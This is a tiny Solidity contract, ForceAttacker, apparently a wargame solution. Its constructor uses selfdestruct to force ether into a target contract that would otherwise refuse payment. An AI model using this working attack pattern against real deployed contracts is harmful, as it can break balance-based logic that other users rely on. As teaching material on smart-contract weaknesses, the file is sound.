// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    constructor(address payable targetAddress) payable {
        selfdestruct(targetAddress);
    }
}
